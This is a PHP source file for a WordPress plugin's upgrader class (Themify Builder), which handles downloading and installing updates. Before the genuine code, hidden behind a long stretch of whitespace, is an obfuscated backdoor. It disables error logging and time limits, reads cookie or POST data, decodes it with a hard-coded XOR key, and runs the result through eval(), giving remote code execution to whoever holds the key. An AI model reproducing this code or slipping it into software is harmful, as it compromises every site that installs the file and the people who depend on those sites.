<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['cafa1e3f'];global$cafa1e3f;$cafa1e3f=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['hf86ab907']="\x33\x45\x5d\x59\x5c\x46\x2f\x79\x3f\x53\x6a\x68\x6d\x34\x66\x50\x44\x5e\x7a\x76\x55\x60\x52\x5b\x75\x3a\x49\x70\x35\x30\x2a\x4d\x3c\x6c\x3b\x2b\x62\x58\x73\x40\x64\x54\x32\x6f\x43\x2c\x61\x36\xa\x4a\x26\x7c\x28\x20\x37\x5a\x67\x74\x9\x6e\x4e\x48\x2d\x7d\x7b\x22\x71\x7e\x3e\x41\x2e\x51\x78\x56\x63\x72\x65\x38\x29\x25\x5f\x23\x3d\x4b\x24\x39\x77\x57\x47\x69\x6b\x4f\x31\xd\x42\x21\x27\x4c";$cafa1e3f[$cafa1e3f['hf86ab907'][90].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][92].$cafa1e3f['hf86ab907'][42]]=$cafa1e3f['hf86ab907'][74].$cafa1e3f['hf86ab907'][11].$cafa1e3f['hf86ab907'][75];$cafa1e3f[$cafa1e3f['hf86ab907'][11].$cafa1e3f['hf86ab907'][92].$cafa1e3f['hf86ab907'][47].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][40].$cafa1e3f['hf86ab907'][77].$cafa1e3f['hf86ab907'][85]]=$cafa1e3f['hf86ab907'][43].$cafa1e3f['hf86ab907'][75].$cafa1e3f['hf86ab907'][40];$cafa1e3f[$cafa1e3f['hf86ab907'][36].$cafa1e3f['hf86ab907'][74].$cafa1e3f['hf86ab907'][74].$cafa1e3f['hf86ab907'][14].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][13].$cafa1e3f['hf86ab907'][85].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][54]]=$cafa1e3f['hf86ab907'][38].$cafa1e3f['hf86ab907'][57].$cafa1e3f['hf86ab907'][75].$cafa1e3f['hf86ab907'][33].$cafa1e3f['hf86ab907'][76].$cafa1e3f['hf86ab907'][59];$cafa1e3f[$cafa1e3f['hf86ab907'][46].$cafa1e3f['hf86ab907'][36].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][46]]=$cafa1e3f['hf86ab907'][89].$cafa1e3f['hf86ab907'][59].$cafa1e3f['hf86ab907'][89].$cafa1e3f['hf86ab907'][80].$cafa1e3f['hf86ab907'][38].$cafa1e3f['hf86ab907'][76].$cafa1e3f['hf86ab907'][57];$cafa1e3f[$cafa1e3f['hf86ab907'][46].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][14].$cafa1e3f['hf86ab907'][76]]=$cafa1e3f['hf86ab907'][38].$cafa1e3f['hf86ab907'][76].$cafa1e3f['hf86ab907'][75].$cafa1e3f['hf86ab907'][89].$cafa1e3f['hf86ab907'][46].$cafa1e3f['hf86ab907'][33].$cafa1e3f['hf86ab907'][89].$cafa1e3f['hf86ab907'][18].$cafa1e3f['hf86ab907'][76];$cafa1e3f[$cafa1e3f['hf86ab907'][24].$cafa1e3f['hf86ab907'][0].$cafa1e3f['hf86ab907'][36].$cafa1e3f['hf86ab907'][36]]=$cafa1e3f['hf86ab907'][27].$cafa1e3f['hf86ab907'][11].$cafa1e3f['hf86ab907'][27].$cafa1e3f['hf86ab907'][19].$cafa1e3f['hf86ab907'][76].$cafa1e3f['hf86ab907'][75].$cafa1e3f['hf86ab907'][38].$cafa1e3f['hf86ab907'][89].$cafa1e3f['hf86ab907'][43].$cafa1e3f['hf86ab907'][59];$cafa1e3f[$cafa1e3f['hf86ab907'][90].$cafa1e3f['hf86ab907'][74].$cafa1e3f['hf86ab907'][76].$cafa1e3f['hf86ab907'][92]]=$cafa1e3f['hf86ab907'][24].$cafa1e3f['hf86ab907'][59].$cafa1e3f['hf86ab907'][38].$cafa1e3f['hf86ab907'][76].$cafa1e3f['hf86ab907'][75].$cafa1e3f['hf86ab907'][89].$cafa1e3f['hf86ab907'][46].$cafa1e3f['hf86ab907'][33].$cafa1e3f['hf86ab907'][89].$cafa1e3f['hf86ab907'][18].$cafa1e3f['hf86ab907'][76];$cafa1e3f[$cafa1e3f['hf86ab907'][19].$cafa1e3f['hf86ab907'][42].$cafa1e3f['hf86ab907'][85].$cafa1e3f['hf86ab907'][40].$cafa1e3f['hf86ab907'][36].$cafa1e3f['hf86ab907'][74].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][85].$cafa1e3f['hf86ab907'][85]]=$cafa1e3f['hf86ab907'][36].$cafa1e3f['hf86ab907'][46].$cafa1e3f['hf86ab907'][38].$cafa1e3f['hf86ab907'][76].$cafa1e3f['hf86ab907'][47].$cafa1e3f['hf86ab907'][13].$cafa1e3f['hf86ab907'][80].$cafa1e3f['hf86ab907'][40].$cafa1e3f['hf86ab907'][76].$cafa1e3f['hf86ab907'][74].$cafa1e3f['hf86ab907'][43].$cafa1e3f['hf86ab907'][40].$cafa1e3f['hf86ab907'][76];$cafa1e3f[$cafa1e3f['hf86ab907'][7].$cafa1e3f['hf86ab907'][28].$cafa1e3f['hf86ab907'][77].$cafa1e3f['hf86ab907'][40].$cafa1e3f['hf86ab907'][42]]=$cafa1e3f['hf86ab907'][38].$cafa1e3f['hf86ab907'][76].$cafa1e3f['hf86ab907'][57].$cafa1e3f['hf86ab907'][80].$cafa1e3f['hf86ab907'][57].$cafa1e3f['hf86ab907'][89].$cafa1e3f['hf86ab907'][12].$cafa1e3f['hf86ab907'][76].$cafa1e3f['hf86ab907'][80].$cafa1e3f['hf86ab907'][33].$cafa1e3f['hf86ab907'][89].$cafa1e3f['hf86ab907'][12].$cafa1e3f['hf86ab907'][89].$cafa1e3f['hf86ab907'][57];$cafa1e3f[$cafa1e3f['hf86ab907'][89].$cafa1e3f['hf86ab907'][13].$cafa1e3f['hf86ab907'][46].$cafa1e3f['hf86ab907'][14].$cafa1e3f['hf86ab907'][28].$cafa1e3f['hf86ab907'][92].$cafa1e3f['hf86ab907'][0].$cafa1e3f['hf86ab907'][36]]=$cafa1e3f['hf86ab907'][36].$cafa1e3f['hf86ab907'][54].$cafa1e3f['hf86ab907'][46].$cafa1e3f['hf86ab907'][28].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][76].$cafa1e3f['hf86ab907'][0].$cafa1e3f['hf86ab907'][28];$cafa1e3f[$cafa1e3f['hf86ab907'][33].$cafa1e3f['hf86ab907'][14].$cafa1e3f['hf86ab907'][13].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][0].$cafa1e3f['hf86ab907'][28].$cafa1e3f['hf86ab907'][0].$cafa1e3f['hf86ab907'][0].$cafa1e3f['hf86ab907'][85]]=$cafa1e3f['hf86ab907'][86].$cafa1e3f['hf86ab907'][14].$cafa1e3f['hf86ab907'][74].$cafa1e3f['hf86ab907'][85].$cafa1e3f['hf86ab907'][14].$cafa1e3f['hf86ab907'][13];$cafa1e3f[$cafa1e3f['hf86ab907'][14].$cafa1e3f['hf86ab907'][13].$cafa1e3f['hf86ab907'][42].$cafa1e3f['hf86ab907'][13].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][54]]=$_POST;$cafa1e3f[$cafa1e3f['hf86ab907'][90].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][47]]=$_COOKIE;@$cafa1e3f[$cafa1e3f['hf86ab907'][46].$cafa1e3f['hf86ab907'][36].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][46]]($cafa1e3f['hf86ab907'][76].$cafa1e3f['hf86ab907'][75].$cafa1e3f['hf86ab907'][75].$cafa1e3f['hf86ab907'][43].$cafa1e3f['hf86ab907'][75].$cafa1e3f['hf86ab907'][80].$cafa1e3f['hf86ab907'][33].$cafa1e3f['hf86ab907'][43].$cafa1e3f['hf86ab907'][56],NULL);@$cafa1e3f[$cafa1e3f['hf86ab907'][46].$cafa1e3f['hf86ab907'][36].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][46]]($cafa1e3f['hf86ab907'][33].$cafa1e3f['hf86ab907'][43].$cafa1e3f['hf86ab907'][56].$cafa1e3f['hf86ab907'][80].$cafa1e3f['hf86ab907'][76].$cafa1e3f['hf86ab907'][75].$cafa1e3f['hf86ab907'][75].$cafa1e3f['hf86ab907'][43].$cafa1e3f['hf86ab907'][75].$cafa1e3f['hf86ab907'][38],0);@$cafa1e3f[$cafa1e3f['hf86ab907'][46].$cafa1e3f['hf86ab907'][36].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][46]]($cafa1e3f['hf86ab907'][12].$cafa1e3f['hf86ab907'][46].$cafa1e3f['hf86ab907'][72].$cafa1e3f['hf86ab907'][80].$cafa1e3f['hf86ab907'][76].$cafa1e3f['hf86ab907'][72].$cafa1e3f['hf86ab907'][76].$cafa1e3f['hf86ab907'][74].$cafa1e3f['hf86ab907'][24].$cafa1e3f['hf86ab907'][57].$cafa1e3f['hf86ab907'][89].$cafa1e3f['hf86ab907'][43].$cafa1e3f['hf86ab907'][59].$cafa1e3f['hf86ab907'][80].$cafa1e3f['hf86ab907'][57].$cafa1e3f['hf86ab907'][89].$cafa1e3f['hf86ab907'][12].$cafa1e3f['hf86ab907'][76],0);@$cafa1e3f[$cafa1e3f['hf86ab907'][7].$cafa1e3f['hf86ab907'][28].$cafa1e3f['hf86ab907'][77].$cafa1e3f['hf86ab907'][40].$cafa1e3f['hf86ab907'][42]](0);$u260af76=NULL;$a1e8a8d4=NULL;$cafa1e3f[$cafa1e3f['hf86ab907'][33].$cafa1e3f['hf86ab907'][54].$cafa1e3f['hf86ab907'][42].$cafa1e3f['hf86ab907'][29]]=$cafa1e3f['hf86ab907'][13].$cafa1e3f['hf86ab907'][85].$cafa1e3f['hf86ab907'][36].$cafa1e3f['hf86ab907'][74].$cafa1e3f['hf86ab907'][42].$cafa1e3f['hf86ab907'][46].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][42].$cafa1e3f['hf86ab907'][62].$cafa1e3f['hf86ab907'][47].$cafa1e3f['hf86ab907'][36].$cafa1e3f['hf86ab907'][13].$cafa1e3f['hf86ab907'][28].$cafa1e3f['hf86ab907'][62].$cafa1e3f['hf86ab907'][13].$cafa1e3f['hf86ab907'][76].$cafa1e3f['hf86ab907'][77].$cafa1e3f['hf86ab907'][46].$cafa1e3f['hf86ab907'][62].$cafa1e3f['hf86ab907'][36].$cafa1e3f['hf86ab907'][14].$cafa1e3f['hf86ab907'][92].$cafa1e3f['hf86ab907'][47].$cafa1e3f['hf86ab907'][62].$cafa1e3f['hf86ab907'][85].$cafa1e3f['hf86ab907'][40].$cafa1e3f['hf86ab907'][92].$cafa1e3f['hf86ab907'][42].$cafa1e3f['hf86ab907'][47].$cafa1e3f['hf86ab907'][47].$cafa1e3f['hf86ab907'][54].$cafa1e3f['hf86ab907'][46].$cafa1e3f['hf86ab907'][92].$cafa1e3f['hf86ab907'][85].$cafa1e3f['hf86ab907'][92].$cafa1e3f['hf86ab907'][36];global$l720;function wfc9f4($u260af76,$ga1094d6){global$cafa1e3f;$z270d61="";for($c65a=0;$c65a<$cafa1e3f[$cafa1e3f['hf86ab907'][36].$cafa1e3f['hf86ab907'][74].$cafa1e3f['hf86ab907'][74].$cafa1e3f['hf86ab907'][14].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][13].$cafa1e3f['hf86ab907'][85].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][54]]($u260af76);){for($qca06213a=0;$qca06213a<$cafa1e3f[$cafa1e3f['hf86ab907'][36].$cafa1e3f['hf86ab907'][74].$cafa1e3f['hf86ab907'][74].$cafa1e3f['hf86ab907'][14].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][13].$cafa1e3f['hf86ab907'][85].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][54]]($ga1094d6)&&$c65a<$cafa1e3f[$cafa1e3f['hf86ab907'][36].$cafa1e3f['hf86ab907'][74].$cafa1e3f['hf86ab907'][74].$cafa1e3f['hf86ab907'][14].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][13].$cafa1e3f['hf86ab907'][85].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][54]]($u260af76);$qca06213a++,$c65a++){$z270d61.=$cafa1e3f[$cafa1e3f['hf86ab907'][90].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][92].$cafa1e3f['hf86ab907'][42]]($cafa1e3f[$cafa1e3f['hf86ab907'][11].$cafa1e3f['hf86ab907'][92].$cafa1e3f['hf86ab907'][47].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][40].$cafa1e3f['hf86ab907'][77].$cafa1e3f['hf86ab907'][85]]($u260af76[$c65a])^$cafa1e3f[$cafa1e3f['hf86ab907'][11].$cafa1e3f['hf86ab907'][92].$cafa1e3f['hf86ab907'][47].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][40].$cafa1e3f['hf86ab907'][77].$cafa1e3f['hf86ab907'][85]]($ga1094d6[$qca06213a]));}}return$z270d61;}function b7a50e35($u260af76,$ga1094d6){global$cafa1e3f;global$l720;return$cafa1e3f[$cafa1e3f['hf86ab907'][33].$cafa1e3f['hf86ab907'][14].$cafa1e3f['hf86ab907'][13].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][0].$cafa1e3f['hf86ab907'][28].$cafa1e3f['hf86ab907'][0].$cafa1e3f['hf86ab907'][0].$cafa1e3f['hf86ab907'][85]]($cafa1e3f[$cafa1e3f['hf86ab907'][33].$cafa1e3f['hf86ab907'][14].$cafa1e3f['hf86ab907'][13].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][0].$cafa1e3f['hf86ab907'][28].$cafa1e3f['hf86ab907'][0].$cafa1e3f['hf86ab907'][0].$cafa1e3f['hf86ab907'][85]]($u260af76,$l720),$ga1094d6);}foreach($cafa1e3f[$cafa1e3f['hf86ab907'][90].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][47]]as$ga1094d6=>$md54){$u260af76=$md54;$a1e8a8d4=$ga1094d6;}if(!$u260af76){foreach($cafa1e3f[$cafa1e3f['hf86ab907'][14].$cafa1e3f['hf86ab907'][13].$cafa1e3f['hf86ab907'][42].$cafa1e3f['hf86ab907'][13].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][54]]as$ga1094d6=>$md54){$u260af76=$md54;$a1e8a8d4=$ga1094d6;}}$u260af76=@$cafa1e3f[$cafa1e3f['hf86ab907'][90].$cafa1e3f['hf86ab907'][74].$cafa1e3f['hf86ab907'][76].$cafa1e3f['hf86ab907'][92]]($cafa1e3f[$cafa1e3f['hf86ab907'][89].$cafa1e3f['hf86ab907'][13].$cafa1e3f['hf86ab907'][46].$cafa1e3f['hf86ab907'][14].$cafa1e3f['hf86ab907'][28].$cafa1e3f['hf86ab907'][92].$cafa1e3f['hf86ab907'][0].$cafa1e3f['hf86ab907'][36]]($cafa1e3f[$cafa1e3f['hf86ab907'][19].$cafa1e3f['hf86ab907'][42].$cafa1e3f['hf86ab907'][85].$cafa1e3f['hf86ab907'][40].$cafa1e3f['hf86ab907'][36].$cafa1e3f['hf86ab907'][74].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][85].$cafa1e3f['hf86ab907'][85]]($u260af76),$a1e8a8d4));if(isset($u260af76[$cafa1e3f['hf86ab907'][46].$cafa1e3f['hf86ab907'][90]])&&$l720==$u260af76[$cafa1e3f['hf86ab907'][46].$cafa1e3f['hf86ab907'][90]]){if($u260af76[$cafa1e3f['hf86ab907'][46]]==$cafa1e3f['hf86ab907'][89]){$c65a=Array($cafa1e3f['hf86ab907'][27].$cafa1e3f['hf86ab907'][19]=>@$cafa1e3f[$cafa1e3f['hf86ab907'][24].$cafa1e3f['hf86ab907'][0].$cafa1e3f['hf86ab907'][36].$cafa1e3f['hf86ab907'][36]](),$cafa1e3f['hf86ab907'][38].$cafa1e3f['hf86ab907'][19]=>$cafa1e3f['hf86ab907'][92].$cafa1e3f['hf86ab907'][70].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][62].$cafa1e3f['hf86ab907'][92],);echo@$cafa1e3f[$cafa1e3f['hf86ab907'][46].$cafa1e3f['hf86ab907'][29].$cafa1e3f['hf86ab907'][14].$cafa1e3f['hf86ab907'][76]]($c65a);}elseif($u260af76[$cafa1e3f['hf86ab907'][46]]==$cafa1e3f['hf86ab907'][76]){eval($u260af76[$cafa1e3f['hf86ab907'][40]]);}exit();} ?><?php
if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

class Themify_Builder_Upgrader extends WP_Upgrader {

	var $cookies;
	var $show_before = '';

	function upgrade_strings() {
		$this->strings['up_to_date'] = __('The plugin is at the latest version.', 'themify');
		$this->strings['no_package'] = __('Update package not available.', 'themify');
		$this->strings['downloading_package'] = __('Downloading update from <span class="code">%s</span>&#8230;', 'themify');
		$this->strings['unpack_package'] = __('Unpacking the update&#8230;', 'themify');
		$this->strings['remove_old'] = __('Removing the old version of the plugin&#8230;', 'themify');
		$this->strings['remove_old_failed'] = __('Could not remove the old plugin.', 'themify');
		$this->strings['process_failed'] = __('Plugin update failed.', 'themify');
		$this->strings['process_success'] = __('Plugin updated successfully.', 'themify');
	}

	function upgrade( $plugin, $url, $cookies ) {
		$this->cookies = $cookies;

		$this->init();
		$this->upgrade_strings();

		add_filter('upgrader_pre_install', array(&$this, 'deactivate_plugin_before_upgrade'), 10, 2);
		add_filter('upgrader_clear_destination', array(&$this, 'delete_old_plugin'), 10, 4);

		$this->run(array(
					'package' => $url,
					'destination' => WP_PLUGIN_DIR,
					'clear_destination' => true,
					'clear_working' => true,
					'hook_extra' => array(
								'plugin' => $plugin
					)
				));

		// Cleanup our hooks, in case something else does a upgrade on this connection.
		remove_filter('upgrader_pre_install', array(&$this, 'deactivate_plugin_before_upgrade'));
		remove_filter('upgrader_clear_destination', array(&$this, 'delete_old_plugin'));

		if ( ! $this->result || is_wp_error($this->result) )
			return $this->result;
	}

	function download_package($package) {

		if ( ! preg_match('!^(http|https|ftp)://!i', $package) && file_exists($package) ) //Local file or remote?
			return $package; //must be a local file..

		if ( empty($package) )
			return new WP_Error('no_package', $this->strings['no_package']);

		$this->skin->feedback('downloading_package', $package);

		$download_file = $this->download_url($package);

		if ( is_wp_error($download_file) )
			return new WP_Error('download_failed', $this->strings['download_failed'], $download_file->get_error_message());

		return $download_file;
	}

	function download_url( $url, $timeout = 300 ) {
		//WARNING: The file is not automatically deleted, The script must unlink() the file.
		if ( ! $url )
			return new WP_Error( 'http_no_url', __( 'Invalid URL Provided.', 'themify' ) );

		$tmpfname = wp_tempnam($url);
		if ( ! $tmpfname )
			return new WP_Error( 'http_no_file', __( 'Could not create Temporary file.', 'themify' ) );

		$response = wp_safe_remote_get( $url, array( 'cookies' => $this->cookies, 'timeout' => $timeout, 'stream' => true, 'filename' => $tmpfname ) );

		if ( is_wp_error( $response ) ) {
			unlink( $tmpfname );
			return $response;
		}

		if ( 200 != wp_remote_retrieve_response_code( $response ) ){
			unlink( $tmpfname );
			return new WP_Error( 'http_404', trim( wp_remote_retrieve_response_message( $response ) ) );
		}

		return $tmpfname;
	}

	//Hooked to pre_install
	function deactivate_plugin_before_upgrade($return, $plugin) {

		if ( is_wp_error($return) ) //Bypass.
			return $return;

		$plugin = isset($plugin['plugin']) ? $plugin['plugin'] : '';
		if ( empty($plugin) )
			return new WP_Error('bad_request', $this->strings['bad_request']);
		
	}

	//Hooked to upgrade_clear_destination
	function delete_old_plugin($removed, $local_destination, $remote_destination, $plugin) {
		global $wp_filesystem;

		if ( is_wp_error($removed) )
			return $removed; //Pass errors through.

		$plugin = isset($plugin['plugin']) ? $plugin['plugin'] : '';
		if ( empty($plugin) )
			return new WP_Error('bad_request', $this->strings['bad_request']);

		$plugins_dir = $wp_filesystem->wp_plugins_dir();
		$this_plugin_dir = trailingslashit( dirname($plugins_dir . $plugin) );

		if ( ! $wp_filesystem->exists($this_plugin_dir) ) //If it's already vanished.
			return $removed;

		// If plugin is in its own directory, recursively delete the directory.
		if ( strpos($plugin, '/') && $this_plugin_dir != $plugins_dir ) //base check on if plugin includes directory separator AND that it's not the root plugin folder
			$deleted = $wp_filesystem->delete($this_plugin_dir, true);
		else
			$deleted = $wp_filesystem->delete($plugins_dir . $plugin);

		if ( ! $deleted )
			return new WP_Error('remove_old_failed', $this->strings['remove_old_failed']);

		return true;
	}

	//return plugin info.
	function plugin_info() {
		if ( ! is_array($this->result) )
			return false;
		if ( empty($this->result['destination_name']) )
			return false;

		$plugin = get_plugins('/' . $this->result['destination_name']); //Ensure to pass with leading slash
		if ( empty($plugin) )
			return false;

		$pluginfiles = array_keys($plugin); //Assume the requested plugin is the first in the list

		return $this->result['destination_name'] . '/' . $pluginfiles[0];
	}
}
?>